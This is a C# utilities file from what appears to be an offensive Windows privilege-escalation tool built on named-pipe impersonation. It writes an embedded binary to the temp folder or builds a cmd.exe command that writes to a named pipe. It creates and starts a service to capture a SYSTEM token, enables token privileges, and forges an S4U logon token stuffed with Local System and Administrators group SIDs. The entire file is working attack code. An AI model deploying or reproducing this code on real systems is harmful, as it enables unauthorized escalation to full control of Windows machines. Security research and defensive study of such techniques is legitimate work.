using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using NamedPipeImpersonation.Interop;

namespace NamedPipeImpersonation.Library
{
    using NTSTATUS = Int32;

    internal class Utilities
    {
        public static IntPtr StartNamedPipeClientService()
        {
            IntPtr hSCManager;
            string command;
            var hService = IntPtr.Zero;

            if (Globals.UseDropper)
            {
                try
                {
                    Globals.BinaryPath = string.Format(@"{0}\PrivFuPipeClient.exe", Path.GetTempPath().TrimEnd('\\'));
                    File.WriteAllBytes(Globals.BinaryPath, Globals.BinaryData);
                }
                catch
                {
                    return IntPtr.Zero;
                }

                command = string.Format(@"{0} {1}", Globals.BinaryPath, Globals.ServiceName);
            }
            else
            {
                command = string.Format(
                    @"{0} /c echo {1} > \\.\pipe\{1}",
                    Environment.GetEnvironmentVariable("COMSPEC"),
                    Globals.ServiceName);
            }

            hSCManager = NativeMethods.OpenSCManager(
                null,
                null,
                ACCESS_MASK.SC_MANAGER_CONNECT | ACCESS_MASK.SC_MANAGER_CREATE_SERVICE);

            if (hSCManager != IntPtr.Zero)
            {
                hService = NativeMethods.CreateService(
                    hSCManager,
                    Globals.ServiceName,
                    Globals.ServiceName,
                    ACCESS_MASK.SERVICE_ALL_ACCESS,
                    SERVICE_TYPE.WIN32_OWN_PROCESS,
                    START_TYPE.DEMAND_START,
                    ERROR_CONTROL.NORMAL,
                    command,
                    null,
                    IntPtr.Zero,
                    null,
                    null,
                    null);
                NativeMethods.CloseServiceHandle(hSCManager);

                if (hService != IntPtr.Zero)
                    NativeMethods.StartService(hService, 0, IntPtr.Zero);
            }

            return hService;
        }


        public static bool EnableTokenPrivileges(
            List<string> requiredPrivs,
            out Dictionary<string, bool> adjustedPrivs)
        {
            return EnableTokenPrivileges(
                WindowsIdentity.GetCurrent().Token,
                requiredPrivs,
                out adjustedPrivs);
        }


        public static bool EnableTokenPrivileges(
            IntPtr hToken,
            List<string> requiredPrivs,
            out Dictionary<string, bool> adjustedPrivs)
        {
            var allEnabled = true;
            adjustedPrivs = new Dictionary<string, bool>();

            do
            {
                if (requiredPrivs.Count == 0)
                    break;

                allEnabled = Helpers.GetTokenPrivileges(
                    hToken,
                    out Dictionary<string, SE_PRIVILEGE_ATTRIBUTES> availablePrivs);

                if (!allEnabled)
                    break;

                foreach (var priv in requiredPrivs)
                {
                    adjustedPrivs.Add(priv, false);

                    foreach (var available in availablePrivs)
                    {
                        if (Helpers.CompareIgnoreCase(available.Key, priv))
                        {
                            if ((available.Value & SE_PRIVILEGE_ATTRIBUTES.ENABLED) != 0)
                            {
                                adjustedPrivs[priv] = true;
                            }
                            else
                            {
                                IntPtr pTokenPrivileges = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)));
                                var tokenPrivileges = new TOKEN_PRIVILEGES(1);

                                if (NativeMethods.LookupPrivilegeValue(
                                    null,
                                    priv,
                                    out tokenPrivileges.Privileges[0].Luid))
                                {
                                    tokenPrivileges.Privileges[0].Attributes = (int)SE_PRIVILEGE_ATTRIBUTES.ENABLED;
                                    Marshal.StructureToPtr(tokenPrivileges, pTokenPrivileges, true);

                                    adjustedPrivs[priv] = NativeMethods.AdjustTokenPrivileges(
                                        hToken,
                                        false,
                                        pTokenPrivileges,
                                        Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)),
                                        IntPtr.Zero,
                                        out int _);
                                    adjustedPrivs[priv] = (adjustedPrivs[priv] && (Marshal.GetLastWin32Error() == 0));
                                }

                                Marshal.FreeHGlobal(pTokenPrivileges);
                            }

                            break;
                        }
                    }

                    if (!adjustedPrivs[priv])
                        allEnabled = false;
                }
            } while (false);

            return allEnabled;
        }


        public static bool ImpersonateThreadToken(IntPtr hImpersonationToken)
        {
            IntPtr pImpersonationLevel = Marshal.AllocHGlobal(4);
            bool status = NativeMethods.ImpersonateLoggedOnUser(hImpersonationToken);

            if (status)
            {
                NTSTATUS ntstatus = NativeMethods.NtQueryInformationToken(
                    WindowsIdentity.GetCurrent().Token,
                    TOKEN_INFORMATION_CLASS.TokenImpersonationLevel,
                    pImpersonationLevel,
                    4u,
                    out uint _);
                status = (ntstatus == Win32Consts.STATUS_SUCCESS);

                if (status)
                {
                    var level = (SECURITY_IMPERSONATION_LEVEL)Marshal.ReadInt32(pImpersonationLevel);

                    if (level == SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation)
                        status = true;
                    else if (level == SECURITY_IMPERSONATION_LEVEL.SecurityDelegation)
                        status = true;
                    else
                        status = false;
                }
            }

            Marshal.FreeHGlobal(pImpersonationLevel);

            return status;
        }


        public static bool ImpersonateWithMsvS4uLogon(string upn, string domain)
        {
            var status = false;

            do
            {
                var pkgName = new LSA_STRING(Win32Consts.MSV1_0_PACKAGE_NAME);
                var tokenGroups = new TOKEN_GROUPS(5);

                NTSTATUS ntstatus = NativeMethods.LsaConnectUntrusted(out IntPtr hLsa);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    NativeMethods.SetLastError(NativeMethods.LsaNtStatusToWinError(ntstatus));
                    break;
                }

                ntstatus = NativeMethods.LsaLookupAuthenticationPackage(hLsa, in pkgName, out uint authnPkg);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    NativeMethods.LsaClose(hLsa);
                    NativeMethods.SetLastError(NativeMethods.LsaNtStatusToWinError(ntstatus));
                    break;
                }

                NativeMethods.ConvertStringSidToSid("S-1-1-0", out IntPtr pEveryoneSid);
                NativeMethods.ConvertStringSidToSid("S-1-5-11", out IntPtr pAuthenticatedUsersSid);
                NativeMethods.ConvertStringSidToSid("S-1-5-18", out IntPtr pLocalSystemSid);
                NativeMethods.ConvertStringSidToSid("S-1-5-20", out IntPtr pNetworkServiceSid);
                NativeMethods.ConvertStringSidToSid("S-1-5-32-544", out IntPtr pAdminSid);

                tokenGroups.Groups[0].Sid = pEveryoneSid;
                tokenGroups.Groups[0].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
                tokenGroups.Groups[1].Sid = pAuthenticatedUsersSid;
                tokenGroups.Groups[1].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
                tokenGroups.Groups[2].Sid = pLocalSystemSid;
                tokenGroups.Groups[2].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
                tokenGroups.Groups[3].Sid = pNetworkServiceSid;
                tokenGroups.Groups[3].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
                tokenGroups.Groups[4].Sid = pAdminSid;
                tokenGroups.Groups[4].Attributes = (int)(SE_GROUP_ATTRIBUTES.OWNER | SE_GROUP_ATTRIBUTES.ENABLED);

                using (var msv = new MSV1_0_S4U_LOGON(MSV1_0_LOGON_SUBMIT_TYPE.MsV1_0S4ULogon, 0, upn, domain))
                {
                    IntPtr pTokenBuffer = Marshal.AllocHGlobal(IntPtr.Size);
                    var originName = new LSA_STRING("S4U");
                    var tokenSource = new TOKEN_SOURCE("User32");
                    ntstatus = NativeMethods.LsaLogonUser(
                        hLsa,
                        in originName,
                        SECURITY_LOGON_TYPE.Network,
                        authnPkg,
                        msv.Buffer,
                        (uint)msv.Length,
                        in tokenGroups,
                        in tokenSource,
                        out IntPtr ProfileBuffer,
                        out uint _,
                        out LUID _,
                        pTokenBuffer,
                        out QUOTA_LIMITS _,
                        out NTSTATUS _);
                    NativeMethods.LsaFreeReturnBuffer(ProfileBuffer);
                    NativeMethods.LsaClose(hLsa);

                    if (ntstatus != Win32Consts.STATUS_SUCCESS)
                    {
                        NativeMethods.SetLastError(NativeMethods.LsaNtStatusToWinError(ntstatus));
                    }
                    else
                    {
                        var hS4uLogonToken = Marshal.ReadIntPtr(pTokenBuffer);
                        status = ImpersonateThreadToken(hS4uLogonToken);
                        NativeMethods.NtClose(hS4uLogonToken);
                    }

                    Marshal.FreeHGlobal(pTokenBuffer);
                }

                NativeMethods.LocalFree(pEveryoneSid);
                NativeMethods.LocalFree(pAuthenticatedUsersSid);
                NativeMethods.LocalFree(pLocalSystemSid);
                NativeMethods.LocalFree(pNetworkServiceSid);
                NativeMethods.LocalFree(pAdminSid);
            } while (false);

            return status;
        }
    }
}
